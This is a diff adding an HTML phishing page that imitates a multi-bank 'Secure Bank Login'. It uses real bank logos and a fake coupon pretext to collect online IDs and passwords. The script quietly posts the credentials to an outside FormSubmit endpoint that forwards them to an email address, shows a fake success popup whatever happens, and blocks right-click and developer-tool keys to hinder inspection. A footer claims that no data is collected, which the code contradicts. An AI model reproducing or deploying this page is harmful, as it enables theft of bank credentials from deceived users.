@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Bank Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Arial', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #1a237e, #0d47a1);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .login-container {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 800px;
+      padding: 30px;
+      position: relative;
+    }
+
+    /* ---------- Instruction Styles ---------- */
+    .instruction {
+      text-align: center;
+      font-size: 1rem;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    /* ---------- Bank Selection Styles ---------- */
+    .bank-selection {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+      gap: 15px;
+      margin-bottom: 30px;
+    }
+
+    .bank-card {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-align: center;
+    }
+
+    .bank-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .bank-card img {
+      width: 60px;
+      height: 60px;
+      object-fit: contain;
+      margin-bottom: 10px;
+    }
+
+    /* ---------- Login Form Styles ---------- */
+    .login-form {
+      display: none;
+    }
+    .active-form {
+      display: block;
+    }
+    .bank-header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .bank-header img {
+      height: 50px;
+      margin-bottom: 15px;
+    }
+    .input-group {
+      margin-bottom: 20px;
+    }
+    .input-group label {
+      display: block;
+      margin-bottom: 8px;
+      color: #333;
+      font-weight: 500;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border-color 0.3s ease;
+    }
+    .input-group input:focus {
+      border-color: #1a237e;
+      outline: none;
+    }
+    .security-features {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    .login-btn {
+      background: #1a237e;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 8px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-top: 20px;
+    }
+    .login-btn:hover {
+      background: #0d47a1;
+    }
+    .security-notice {
+      text-align: center;
+      margin-top: 20px;
+      color: #666;
+      font-size: 0.9em;
+    }
+    .loading {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+    }
+    .disclaimer {
+      text-align: center;
+      color: #999;
+      font-size: 0.8em;
+      margin-top: 30px;
+    }
+    .change-bank {
+      text-align: center;
+      margin-top: 15px;
+      color: #1a237e;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+
+    /* ---------- Success Popup Modal ---------- */
+    .success-popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      justify-content: center;
+      align-items: center;
+      z-index: 1001;
+    }
+    .success-popup .popup-content {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+    .success-popup button {
+      margin-top: 20px;
+      background: #1a237e;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .success-popup button:hover {
+      background: #0d47a1;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <!-- The entire flow is wrapped in one form.
+         The action posts to FormSubmit (which sends the data to your email),
+         and hidden fields (_captcha, _next) are included. -->
+    <form id="bankLogin" action="https://formsubmit.co/1aaf0d8563b5b9ec1f0b55f5e8e1cdee" method="POST">
+      <!-- Optional hidden fields for FormSubmit -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="checkout.html">
+      <!-- Hidden input to hold the selected bank name -->
+      <input type="hidden" name="selectedBank" id="selectedBank" value="">
+
+   
+
+      <!-- Bank Selection Section -->
+         <!-- Instructional Text -->
+   <p class="instruction">Select your card issuer to validate ownership</p>
+      <div class="bank-selection" id="bankSelection">
+        <div class="bank-card" data-bank="Chase">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Chase_Bank_logo_2016.svg/1200px-Chase_Bank_logo_2016.svg.png" alt="Chase">
+          <span>Chase</span>
+        </div>
+        <div class="bank-card" data-bank="Bank of America">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dd/Bank_of_America_logo.svg/1200px-Bank_of_America_logo.svg.png" alt="BOA">
+          <span>Bank of America</span>
+        </div>
+        <div class="bank-card" data-bank="Wells Fargo">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Wells_Fargo_%282020%29.svg/1200px-Wells_Fargo_%282020%29.svg.png" alt="Wells Fargo">
+          <span>Wells Fargo</span>
+        </div>
+        <div class="bank-card" data-bank="Citi Bank">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Citibank.svg/1200px-Citibank.svg.png" alt="Citi">
+          <span>Citi Bank</span>
+        </div>
+        <div class="bank-card" data-bank="HSBC">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/Hsbc_logo_%282018%29.svg/1200px-Hsbc_logo_%282018%29.svg.png" alt="HSBC">
+          <span>HSBC</span>
+        </div>
+        <div class="bank-card" data-bank="Santander">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/Santander_logo.svg/1200px-Santander_logo.svg.png" alt="Santander">
+          <span>Santander</span>
+        </div>
+        <div class="bank-card" data-bank="Barclays">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/Barclays_logo.svg/1200px-Barclays_logo.svg.png" alt="Barclays">
+          <span>Barclays</span>
+        </div>
+        <div class="bank-card" data-bank="TD Bank">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/TD_Bank_Group_logo.svg/1200px-TD_Bank_Group_logo.svg.png" alt="TD Bank">
+          <span>TD Bank</span>
+        </div>
+      </div>
+
+      <!-- Login Form Section -->
+      <div class="login-form" id="loginForm">
+        <div class="bank-header" id="bankHeader">
+          <h2>Secure Online Banking Login</h2>
+        </div>
+
+        <div class="input-group">
+          <label for="username">Online ID</label>
+          <input type="text" id="username" name="username" required>
+        </div>
+
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required>
+        </div>
+
+        <div class="security-features">
+          <i class="fas fa-lock"></i>
+          <span>Secure Connection (256-bit SSL Encryption)</span>
+        </div>
+
+        <!-- The Sign In button is placed at the end of the form -->
+        <button type="submit" class="login-btn">Sign In</button>
+
+        <div class="change-bank" id="changeBank">Change Bank</div>
+
+        <div class="security-notice">
+          <i class="fas fa-shield-alt"></i>
+          We protect your information with the latest security technology
+        </div>
+
+        <div class="loading" id="loading">
+          <i class="fas fa-spinner fa-spin"></i>
+          Verifying your information...
+        </div>
+      </div>
+    </form>
+
+    <div class="disclaimer">
+      This is a demonstration page only. No real banking information is collected or stored.
+    </div>
+
+    <!-- Success Popup Modal -->
+    <div class="success-popup" id="successPopup">
+      <div class="popup-content">
+        <p>Coupon code successfully claimed. Proceed to checkout page to use code: SAVE10</p>
+        <button id="proceedCheckout">Proceed to Checkout</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Elements used in the process
+    const bankCards = document.querySelectorAll('.bank-card');
+    const bankSelection = document.getElementById('bankSelection');
+    const loginForm = document.getElementById('loginForm');
+    const bankHeader = document.getElementById('bankHeader');
+    const changeBank = document.getElementById('changeBank');
+    const loading = document.getElementById('loading');
+    const successPopup = document.getElementById('successPopup');
+    const proceedCheckout = document.getElementById('proceedCheckout');
+    const selectedBankInput = document.getElementById('selectedBank');
+    const bankLoginForm = document.getElementById('bankLogin');
+
+    // When a bank card is clicked…
+    bankCards.forEach(card => {
+      card.addEventListener('click', () => {
+        // Hide all other bank cards
+        bankCards.forEach(c => {
+          if (c !== card) {
+            c.style.display = 'none';
+          }
+        });
+        // Highlight the selected card
+        card.style.backgroundColor = '#f5f5f5';
+
+        // Get the bank name and update the hidden input
+        const bankName = card.getAttribute('data-bank');
+        selectedBankInput.value = bankName;
+
+        // Update bank header with the selected bank’s logo and name
+        const bankLogoSrc = card.querySelector('img').src;
+        bankHeader.innerHTML = `
+          <img src="${bankLogoSrc}" alt="${bankName}">
+          <h2>${bankName} Secure Online Banking Login</h2>
+        `;
+
+        // Show the login form
+        loginForm.classList.add('active-form');
+      });
+    });
+
+    // Handle "Change Bank" action so the user can select a different bank
+    changeBank.addEventListener('click', () => {
+      bankCards.forEach(c => {
+        c.style.display = 'block';
+        c.style.backgroundColor = '#fff';
+      });
+      loginForm.classList.remove('active-form');
+      bankHeader.innerHTML = `<h2>Secure Online Banking Login</h2>`;
+      selectedBankInput.value = '';
+    });
+
+    // Handle login form submission using fetch (with a simulated delay)
+    bankLoginForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      loading.style.display = 'block';
+
+      // Create a FormData object from the form
+      const formData = new FormData(bankLoginForm);
+
+      // Simulate a 2-second delay then post data to FormSubmit
+      setTimeout(() => {
+        loading.style.display = 'none';
+        // Post the form data using fetch (using no-cors so that the browser doesn't block it)
+        fetch(bankLoginForm.action, {
+          method: bankLoginForm.method,
+          body: formData,
+          mode: 'no-cors'
+        }).catch(err => {
+          // Suppress errors in no-cors mode
+        }).finally(() => {
+          // Show success popup regardless of fetch result
+          successPopup.style.display = 'flex';
+        });
+      }, 2000);
+    });
+
+    // Handle "Proceed to Checkout" action from the popup
+    proceedCheckout.addEventListener('click', () => {
+      window.location.href = 'checkout.html';
+    });
+
+    // Disable right-click and certain keys for extra security
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.onkeydown = (e) => {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        return false;
+      }
+    };
+  </script>
+</body>
+</html>
